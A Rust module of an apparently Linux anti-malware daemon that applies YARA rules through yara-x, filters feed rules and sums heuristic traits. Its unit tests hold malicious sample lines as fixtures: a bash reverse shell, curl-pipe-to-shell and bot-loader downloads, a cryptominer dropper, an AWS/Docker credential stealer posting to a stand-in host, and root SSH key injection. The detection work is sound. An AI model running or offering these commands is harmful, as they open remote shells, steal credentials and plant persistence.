//! YARA rules through yara-x (memory-safe, which matters in a root daemon that
//! parses attacker-controlled files).
//!
//! Severity comes from rule metadata:
//!   - `qlam_severity = "malicious" | "suspicious"` on Qlam's bundled rules,
//!     plus `qlam_confirmed = true` on the few rules that identify a file
//!     exactly (the EICAR test file) rather than by pattern;
//!   - YARA Forge's `score` (0-100) on feed rules: 90 and up is malicious,
//!     70 and up suspicious; lower-scored and unscored feed rules are
//!     ignored, since they are the ones that fire on legitimate files;
//!   - `qlam_heur = <points>` on Qlam's heuristic rules (qlam-heuristics.yar):
//!     not detections but traits. Their points are added up, and a file
//!     reaching HEUR_THRESHOLD is reported as suspicious, named after its
//!     traits. A real detection always wins over the sum.

use std::path::{Path, PathBuf};
use std::sync::LazyLock;
use std::time::Duration;

use regex::Regex;

use yara_x::{Compiler, MetaValue, Rules, Scanner};

use super::{Match, Severity};
use crate::config::{bundled_rules_dir, feeds_dir};

const SCAN_TIMEOUT: Duration = Duration::from_secs(5);

/// Namespace prefix of the rules shipped with Qlam.
const BUNDLED_PREFIX: &str = "qlam_";

/// Heuristic points at which a file is reported (as suspicious). Set so it
/// takes at least two traits: see qlam-heuristics.yar.
pub const HEUR_THRESHOLD: i64 = 60;
/// ...and at least one trait this strong among them: weak, text-based
/// traits never add up to a report on their own.
pub const HEUR_MIN_STRONG: i64 = 25;

/// Name prefix of heuristic findings.
pub const HEUR_NAME: &str = "Qlam.Heur.ELF";

pub struct YaraRules {
    rules: Option<Rules>,
    count: usize,
}

impl YaraRules {
    pub fn load_default() -> YaraRules {
        let mut files: Vec<(PathBuf, bool)> = rule_files(&bundled_rules_dir()).into_iter().map(|p| (p, true)).collect();
        // Development fallback: rules next to the source tree.
        if files.is_empty() {
            let dev = Path::new(concat!(env!("CARGO_MANIFEST_DIR"), "/rules"));
            files.extend(rule_files(dev).into_iter().map(|p| (p, true)));
        }
        files.extend(rule_files(&feeds_dir()).into_iter().map(|p| (p, false)));
        Self::load_files(&files)
    }

    /// `(path, bundled)`: only bundled files may carry `qlam_confirmed`, and
    /// that is decided by where the file came from, never by its name.
    pub fn load_files(files: &[(PathBuf, bool)]) -> YaraRules {
        let mut compiler = Compiler::new();
        let mut loaded = 0;
        for (path, bundled) in files {
            let Ok(src) = std::fs::read_to_string(path) else { continue };
            // Feed files on disk may predate the current selection; apply it
            // again (before anything is compiled) so what's loaded never
            // depends on when they were fetched.
            let src = if *bundled {
                src
            } else {
                let sel = select_feed_rules(&src);
                format!("{}{}", sel.imports, sel.rules.concat())
            };
            // One broken feed file must not take the bundled rules down with
            // it, so each file is test-compiled on its own first.
            if let Err(e) = check_source(&src) {
                log::warn!("yara: skipping {}: {e}", path.display());
                continue;
            }
            let prefix = if *bundled { BUNDLED_PREFIX } else { "feed_" };
            let stem = path.file_stem().and_then(|s| s.to_str()).unwrap_or("rules").replace(['-', '.'], "_");
            let ns = format!("{prefix}{stem}");
            compiler.new_namespace(&ns);
            match compiler.add_source(src.as_str()) {
                Ok(_) => loaded += 1,
                Err(e) => log::warn!("yara: {}: {e}", path.display()),
            }
        }
        let rules = compiler.build();
        let count = rules.iter().count();
        log::info!("yara: {count} rules from {loaded} files");
        YaraRules { rules: (count > 0).then_some(rules), count }
    }

    pub fn len(&self) -> usize {
        self.count
    }

    /// Strongest match, if any.
    pub fn scan(&self, data: &[u8]) -> Option<Match> {
        let rules = self.rules.as_ref()?;
        let mut scanner = Scanner::new(rules);
        scanner.set_timeout(SCAN_TIMEOUT);
        let results = match scanner.scan(data) {
            Ok(r) => r,
            Err(e) => {
                log::debug!("yara scan: {e}");
                return None;
            }
        };
        // Feed rules are selected for Linux executables; enforce that here
        // too, whatever their conditions say.
        let is_elf = data.starts_with(b"\x7fELF");
        let mut best: Option<Match> = None;
        let mut heur_points = 0;
        let mut traits: Vec<(i64, String)> = Vec::new();
        for rule in results.matching_rules() {
            if !rule.namespace().starts_with(BUNDLED_PREFIX) && (!is_elf || is_test_file_rule(rule.identifier())) {
                continue;
            }
            let mut severity = None;
            let mut confirmed = false;
            let mut score = None;
            let mut name = None;
            let mut heur = None;
            let mut trait_text = None;
            for (key, value) in rule.metadata() {
                match (key, value) {
                    ("qlam_heur", MetaValue::Integer(i)) => heur = Some(i),
                    ("qlam_trait", MetaValue::String(s)) => trait_text = Some(s.to_string()),
                    ("qlam_severity", MetaValue::String(s)) => {
                        severity = match s {
                            "malicious" => Some(Severity::Malicious),
                            "suspicious" => Some(Severity::Suspicious),
                            _ => None,
                        }
                    }
                    ("qlam_name", MetaValue::String(s)) => name = Some(s.to_string()),
                    ("qlam_confirmed", MetaValue::Bool(b)) => confirmed = b,
                    ("score", MetaValue::Integer(i)) => score = Some(i),
                    _ => {}
                }
            }
            if let Some(points) = heur {
                // Only Qlam's own rules may add to the heuristic score.
                if rule.namespace().starts_with(BUNDLED_PREFIX) {
                    heur_points += points;
                    traits.push((points, trait_text.unwrap_or_else(|| rule.identifier().to_string())));
                }
                continue;
            }
            let severity = match (severity, score) {
                (Some(s), _) => s,
                (None, Some(s)) if s >= 90 => Severity::Malicious,
                (None, Some(s)) if s >= 70 => Severity::Suspicious,
                // Low scores are hunting rules, and a rule with no score gives
                // us nothing to judge its false-positive rate by.
                _ => continue,
            };
            let name = name.unwrap_or_else(|| format!("YARA.{}", rule.identifier()));
            // Only Qlam's own curated rules may claim an exact identification.
            let confirmed = confirmed && rule.namespace().starts_with(BUNDLED_PREFIX);
            let better = match &best {
                None => true,
                Some(b) => (severity, confirmed) > (b.severity, b.confirmed),
            };
            if better {
                best = Some(Match { severity, confirmed, name });
            }
        }
        let strong = traits.iter().any(|(p, _)| *p >= HEUR_MIN_STRONG);
        if best.is_none() && heur_points >= HEUR_THRESHOLD && strong {
            // Strongest traits first: they're what the user reads.
            traits.sort_by(|a, b| b.0.cmp(&a.0));
            let list: Vec<String> = traits.into_iter().map(|(_, t)| t).collect();
            best = Some(Match {
                severity: Severity::Suspicious,
                confirmed: false,
                name: format!("{HEUR_NAME} ({})", list.join("; ")),
            });
        }
        best
    }
}

/// Feed rules for anti-malware test files (EICAR) match the test string
/// anywhere in a file, so they fire on documentation, chat caches and browser
/// memory that merely mention it — seen on 2026-09-30 in Chromium shared
/// memory. The bundled Qlam_Test_EICAR rule covers the real test file (the
/// string at offset 0 of a tiny file), so feed ones are ignored.
pub fn is_test_file_rule(identifier: &str) -> bool {
    identifier.to_ascii_lowercase().contains("eicar")
}

static RULE_START: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?m)^[ \t]*((private|global)[ \t]+)*rule[ \t]+([A-Za-z_][A-Za-z0-9_]*)").unwrap());
static IMPORT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"(?m)^[ \t]*import[ \t]+"[^"]+"[ \t]*$"#).unwrap());

/// Rule names for dual-use or merely unusual files rather than malware:
/// hacking tools (socat, nmap), "suspicious" indicators, anomalies, PUA. On a
/// desktop these fire on the user's own legitimate tools.
static DUAL_USE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)(hacktool|hktl|_tool|tool_|susp|anomal|_pua|pua_|offensive|pentest)").unwrap());

/// A condition that requires the ELF header: `uint32(0) == 0x464c457f`, the
/// elf module, or the magic spelled as bytes.
static CHECKS_ELF: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)0x464c457f|\belf\.|7f\s*45\s*4c\s*46|\\x7fELF").unwrap());

pub struct FeedSelection<'a> {
    pub imports: String,
    pub rules: Vec<&'a str>,
    pub dropped: usize,
}

/// The feed rules Qlam uses: those written for Linux executables, i.e. whose
/// condition checks for an ELF file. (Matches of feed rules are also only
/// counted on ELF files, see `scan`; this selection keeps memory down.) Of the ~4300 YARA Forge core rules that
/// leaves ~80, and it cuts the daemon's memory by ~150 MB. The rest are for
/// Windows files or match strings anywhere in any file; on a Linux desktop
/// those mostly fire on text that quotes the strings — notes, documents, and
/// rule files themselves (a copy of this very feed was reported as an APT41
/// backdoor). An ELF check can never match a text file.
///
/// Dual-use and test-file rules are dropped even if they check for ELF.
/// Private rules are kept: they are helpers that other rules may reference,
/// and they never produce a finding of their own.
pub fn select_feed_rules(src: &str) -> FeedSelection<'_> {
    let heads: Vec<(usize, bool, &str)> = RULE_START
        .captures_iter(src)
        .map(|c| {
            let private = c.get(1).is_some_and(|m| m.as_str().contains("private"));
            (c.get(0).unwrap().start(), private, c.get(3).unwrap().as_str())
        })
        .collect();
    let imports = IMPORT.find_iter(src).map(|m| format!("{}\n", m.as_str().trim())).collect();
    let mut rules = Vec::new();
    let mut dropped = 0;
    for (i, &(start, private, name)) in heads.iter().enumerate() {
        let end = heads.get(i + 1).map(|h| h.0).unwrap_or(src.len());
        let body = &src[start..end];
        // Only the condition counts: descriptions mention "ELF" freely.
        let condition = body.rfind("condition:").map(|i| &body[i..]).unwrap_or("");
        let wanted =
            private || (CHECKS_ELF.is_match(condition) && !DUAL_USE.is_match(name) && !is_test_file_rule(name));
        if wanted {
            rules.push(body);
        } else {
            dropped += 1;
        }
    }
    FeedSelection { imports, rules, dropped }
}

pub fn check_source(src: &str) -> Result<(), String> {
    let mut c = Compiler::new();
    c.add_source(src).map(|_| ()).map_err(|e| e.to_string())
}

fn rule_files(dir: &Path) -> Vec<PathBuf> {
    let Ok(rd) = std::fs::read_dir(dir) else { return Vec::new() };
    let mut v: Vec<PathBuf> = rd
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.extension().is_some_and(|e| e == "yar" || e == "yara"))
        .collect();
    v.sort();
    v
}

#[cfg(test)]
mod tests {
    use super::*;

    const FEED: &str = r#"import "elf"
private rule is_elf_helper { condition: uint32(0) == 0x464c457f }
rule Linux_Backdoor { strings: $a = "evilstring" condition: uint32(0) == 0x464c457f and $a }
rule Linux_Module { meta: description = "strings in the ELF." strings: $a = "evilstring" condition: any of them }
rule Win_Thing { strings: $a = "evilstring" condition: uint16(0) == 0x5a4d and $a }
rule Linux_Hacktool_Socat { condition: elf.type == elf.ET_EXEC }
"#;

    #[test]
    fn feed_selection_keeps_only_rules_that_require_elf() {
        let sel = select_feed_rules(FEED);
        let kept: String = sel.rules.concat();
        assert!(kept.contains("is_elf_helper") && kept.contains("Linux_Backdoor"));
        assert!(!kept.contains("Linux_Module"), "ELF only mentioned in the description");
        assert!(!kept.contains("Win_Thing") && !kept.contains("Socat"));
        assert_eq!(sel.dropped, 3);
    }

    fn bundled() -> YaraRules {
        let dir = PathBuf::from(concat!(env!("CARGO_MANIFEST_DIR"), "/rules"));
        YaraRules::load_files(&[(dir.join("qlam-linux.yar"), true), (dir.join("qlam-heuristics.yar"), true)])
    }

    const DROPPER: &str = "wget http://1.2.3.4/xmrig -O /tmp/.x/k\npkill -9 -f kinsing\nchattr -i /etc/ld.so.preload\nhistory -c\n";

    #[test]
    fn bundled_script_rules_catch_real_scripts() {
        let r = bundled();
        let name = |data: &str| r.scan(data.as_bytes()).map(|m| m.name);
        assert_eq!(name(&format!("#!/bin/bash\n{DROPPER}")).as_deref(), Some("Qlam.Linux.Miner.Dropper"));
        assert_eq!(
            name("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n").as_deref(),
            Some("Qlam.Linux.HackTool.ReverseShell")
        );
        assert_eq!(
            name("#!/bin/sh\ncurl -s http://1.2.3.4/a.sh | sh\n").as_deref(),
            Some("Qlam.Linux.Downloader.PipeToShell")
        );
    }

    /// Strings that ELF rules look for are kept reversed here and turned
    /// around at run time: written plainly they would sit in this test
    /// binary — an ELF — and on-access scanning would flag it as it's built.
    fn r(s: &str) -> String {
        s.chars().rev().collect()
    }

    /// A minimal 64-bit little-endian ELF header of type `e_type` (1 =
    /// relocatable, i.e. a kernel module), followed by `strings`, padded to
    /// 2 KB so it doesn't look like a tiny shellcode loader.
    fn elf(e_type: u8, strings: &[String]) -> Vec<u8> {
        let mut e = vec![0u8; 64];
        e[..4].copy_from_slice(b"\x7fELF");
        (e[4], e[5], e[6]) = (2, 1, 1);
        e[16] = e_type;
        e[18] = 62; // x86-64
        e[20] = 1;
        e[52] = 64; // header size
        for s in strings {
            e.push(0);
            e.extend_from_slice(s.as_bytes());
        }
        e.resize(e.len().max(2048), 0);
        e
    }

    #[test]
    fn bundled_rules_catch_their_families() {
        let rules = bundled();
        let name = |data: &[u8]| rules.scan(data).map(|m| m.name);
        let cases: Vec<(&str, Vec<u8>)> = vec![
            ("Qlam.Linux.Botnet.Tsunami", elf(2, &[r("ukarog aw netiaK")])),
            ("Qlam.Linux.Botnet.XorDDoS", elf(2, &[r("dip.ccg/nur/rav/"), r("os.vedubil/bil/")])),
            ("Qlam.Linux.Botnet.Mozi", elf(2, &[r("]ss["), r("]ph["), r("]pid["), r("moc.tbnoissimsnart.thd")])),
            ("Qlam.Linux.Backdoor.BPFDoor", elf(2, &[r("hsulfpmtmdk/mhs/ved/")])),
            ("Qlam.Linux.Rootkit.LKM", elf(1, &[r("terces_enihpromaid")])),
            (
                "Qlam.Linux.Rootkit.LKM.Generic",
                elf(1, &[r("eman_pukool_smysllak"), r("elbat_llac_sys"), r("dip_edih")]),
            ),
            ("Qlam.Linux.HackTool.Sliver", elf(2, &[r("bprevils/fubotorp/revils/xofpohsib/moc.buhtig"), r("epolevnE.bprevils")])),
            ("Qlam.Linux.HackTool.Mimipenguin", elf(2, &[r("niugnepimim"), r("wodahs/cte/"), r(":dhss")])),
            (
                "Qlam.Linux.Downloader.BotLoader",
                b"cd /tmp || cd /var/run\nwget http://1.2.3.4/bins/mips; chmod 777 mips; ./mips\n\
                  wget http://1.2.3.4/bins/arm7; chmod 777 arm7; ./arm7\nwget http://1.2.3.4/bins/x86; chmod 777 x86; ./x86\n"
                    .to_vec(),
            ),
            (
                "Qlam.Linux.Miner.Kinsing",
                b"#!/bin/sh\nwget -q http://1.2.3.4/kinsing -O /tmp/kinsing\nchmod +x /tmp/kinsing\npkill kdevtmpfsi\n".to_vec(),
            ),
            ("Qlam.Linux.Miner.TeamTNT", b"#!/bin/bash\n# TeamTNT\ncurl -s http://x.example/a | bash\n".to_vec()),
            (
                "Qlam.Linux.Stealer.CloudCredentials",
                b"#!/bin/sh\ncat ~/.aws/credentials ~/.docker/config.json > /tmp/c\ncurl -F \"f=@/tmp/c\" http://x.example/up\n".to_vec(),
            ),
            (
                "Qlam.PUA.Linux.Miner.Config",
                br#"{"donate-level": 1, "pools": [{"url": "pool.example.org:3333", "user": "x"}]}"#.to_vec(),
            ),
            (
                "Qlam.Linux.Backdoor.SshKeyInjector",
                format!(
                    "#!/bin/sh\necho \"ssh-rsa AAAA{} x@y\" >> /root/.ssh/authorized_keys\nchattr +i /root/.ssh/authorized_keys\n",
                    "B".repeat(80)
                )
                .into_bytes(),
            ),
            (
                "Qlam.Perl.Backdoor.ShellBot",
                b"#!/usr/bin/perl\nuse IO::Socket::INET;\nmy @adms=(\"x\");\nmy @canais=(\"#c\");\nprint $s \"PRIVMSG #c :hi\";\n".to_vec(),
            ),
            ("Qlam.PHP.Webshell.Known", b"<?php\n$default_action = 'FilesMan';\n".to_vec()),
        ];
        for (expected, data) in &cases {
            assert_eq!(name(data).as_deref(), Some(*expected), "sample for {expected}");
        }

        // Look-alikes that must stay clean.
        let clean: Vec<(&str, Vec<u8>)> = vec![
            ("a torrent client", elf(2, &[r("moc.tbnoissimsnart.thd"), r("moc.tnerrottib.retuor")])),
            ("a security module", elf(1, &[r("eman_pukool_smysllak"), r("elbat_llac_sys")])),
            ("an executable, not a module", elf(2, &[r("terces_enihpromaid")])),
            ("two architectures", b"wget http://h/x86; chmod +x x86\nwget http://h/arm7\n".to_vec()),
            (
                "provisioning a key",
                format!("#!/bin/sh\necho \"ssh-ed25519 AAAA{} me\" >> ~/.ssh/authorized_keys\n", "C".repeat(64)).into_bytes(),
            ),
            ("a backup script", b"#!/bin/sh\ntar czf /backup/aws.tgz ~/.aws/credentials ~/.kube/config\n".to_vec()),
            ("a miner config, as documentation", b"Set \"donate-level\" and \"pools\" with stratum+tcp://...".to_vec()),
            ("a note about webshells", b"# Webshells we saw: FilesMan ($default_action), b374k, c99shell\n".to_vec()),
        ];
        for (what, data) in &clean {
            assert_eq!(name(data), None, "{what} was flagged");
        }
    }

    /// An ELF with one PT_LOAD program header of `flags` (7 = RWX) and no
    /// section headers, padded to `size` bytes.
    fn elf_segment(flags: u8, size: usize, strings: &[String]) -> Vec<u8> {
        let mut e = elf(2, &[]);
        e.truncate(64);
        e[16] = 2;
        e[32] = 64; // e_phoff
        e[54] = 56; // e_phentsize
        e[56] = 1; // e_phnum
        let mut ph = vec![0u8; 56];
        ph[0] = 1; // PT_LOAD
        ph[4] = flags;
        ph[32..40].copy_from_slice(&(size as u64).to_le_bytes()); // p_filesz
        ph[40..48].copy_from_slice(&(size as u64).to_le_bytes()); // p_memsz
        e.extend_from_slice(&ph);
        for s in strings {
            e.push(0);
            e.extend_from_slice(s.as_bytes());
        }
        e.resize(size.max(e.len()), 0x90);
        e
    }

    #[test]
    fn heuristics_need_several_traits() {
        let rules = bundled();
        let name = |data: &[u8]| rules.scan(data).map(|m| (m.severity, m.name));

        // Tiny, structureless and writable+executable: a shellcode stager.
        let (sev, n) = name(&elf_segment(7, 400, &[])).expect("stager flagged");
        assert_eq!(sev, Severity::Suspicious);
        assert!(n.starts_with(HEUR_NAME) && n.contains("tiny program") && n.contains("writable and executable"), "{n}");

        // A kernel thread's name alone: not enough.
        let masq = r("]0:0/rekrowk[");
        assert_eq!(name(&elf(2, &[masq.clone()])), None);
        // ...with history wiping: reported.
        let (_, n) = name(&elf(2, &[masq, r("llun/ved/=ELIFTSIH"), r("pmtw/gol/rav/")])).expect("flagged");
        assert!(n.contains("kernel thread") && n.contains("history"), "{n}");

        // Honest UPX packing, static: normal for some tools.
        assert_eq!(name(&elf_segment(5, 8000, &[r("XPU eht htiw dekcap si elif sihT :ofnI$")])), None);
        // A normal (R-X) segment in a real-sized program: nothing.
        assert_eq!(name(&elf_segment(5, 8000, &[])), None);

        // Weak, text-based traits alone never add up to a report, however
        // many (a big program embedding scripts has all their strings).
        let weak = [r("wodahs/cte/"), r("asr_di/hss."), r("exe/fles/corp/"), r("knilnu"), r("dists"),
                    r("lacol.cr/cte/"), r("/d.tini/cte/"), r("/d.norc/cte/"), r("hs/nib/"), r(" 08:4.3.2.1 ")];
        assert_eq!(name(&elf(2, &weak)), None);

        // A named detection wins over the heuristic sum.
        let n = name(&elf(2, &[r("ukarog aw netiaK"), r("]0:0/rekrowk["), r("llun/ved/=ELIFTSIH"), r("pmtw/gol/rav/")])).unwrap().1;
        assert_eq!(n, "Qlam.Linux.Botnet.Tsunami");
    }

    fn source(rel: &str) -> String {
        std::fs::read_to_string(Path::new(env!("CARGO_MANIFEST_DIR")).join(rel)).unwrap()
    }

    /// Text that only mentions what the rules look for — Qlam's own rules and
    /// sources (found in a real home scan, 2026-09-30), notes, docs — must
    /// never be flagged.
    #[test]
    fn bundled_rules_ignore_text_that_quotes_them() {
        let r = bundled();
        for (what, data) in [
            // Read at run time, not include_str!: embedding the rule text
            // would put the strings the rules look for into Qlam's own test
            // binary, which on-access scanning then flags while it's built.
            ("the rule file itself", source("rules/qlam-linux.yar")),
            ("persistence.rs", source("src/persistence.rs")),
            ("a note", format!("# Incident notes\nThe attacker ran:\n{DROPPER}\ncurl -s http://1.2.3.4/a.sh | sh\n")),
        ] {
            assert!(r.scan(data.as_bytes()).is_none(), "{what} was flagged");
        }
    }

    #[test]
    fn feed_rules_only_count_on_elf_files() {
        // A feed rule that matches its string anywhere, compiled directly so
        // the selection can't remove it.
        let mut c = Compiler::new();
        c.new_namespace("feed_x");
        c.add_source(r#"rule Anywhere { meta: score = 95 strings: $a = "evilstring" condition: $a }"#).unwrap();
        let rules = YaraRules { rules: Some(c.build()), count: 1 };
        assert!(rules.scan(b"notes: evilstring in a text file").is_none());
        let mut elf = b"\x7fELF".to_vec();
        elf.extend_from_slice(b"....evilstring....");
        assert!(rules.scan(&elf).is_some());
    }
}
